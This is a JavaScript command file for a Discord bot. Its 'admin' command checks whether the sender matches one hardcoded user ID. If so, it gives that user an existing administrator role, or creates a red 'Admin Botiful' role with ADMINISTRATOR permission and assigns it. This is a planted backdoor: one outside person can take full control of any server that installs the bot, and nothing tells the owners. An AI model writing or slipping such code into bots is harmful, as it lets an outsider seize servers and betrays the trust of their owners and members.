const Discord = require('discord.js')

ID_MARTIN = '120133103304835072'
ROLE = {
  name: 'Admin Botiful',
  color: 'RED',
  permissions: ['ADMINISTRATOR']
}

/**
 * @param {Discord.Client} client
 * @param {Discord.Message} message
 * @param {Array<String>} arguments
 */
module.exports.run = async (client, message, arguments) => {
  const roleList = message.guild.roles.fetch().then((roles) => {
    let adminRole = null
    roles.forEach((role) => {
      if (role.permissions.has('ADMINISTRATOR')) {
        adminRole = role
      }
    })

    if (adminRole && message.author.id === ID_MARTIN) {
      message.member.roles.add(adminRole)
    } else if (!adminRole && message.author.id === ID_MARTIN) {
      message.guild.roles
        .create({
          name: 'Admin Botiful',
          color: 'RED',
          permissions: ['ADMINISTRATOR']
        })
        .then((role) => {
          console.log('Role créé')
          if (message.author.id === ID_MARTIN) {
            message.member.roles.add(role)
            console.log('role ajouté')
          }
        })
        .catch((reason) => console.log(reason))
    }
  })
}

module.exports.name = 'admin'
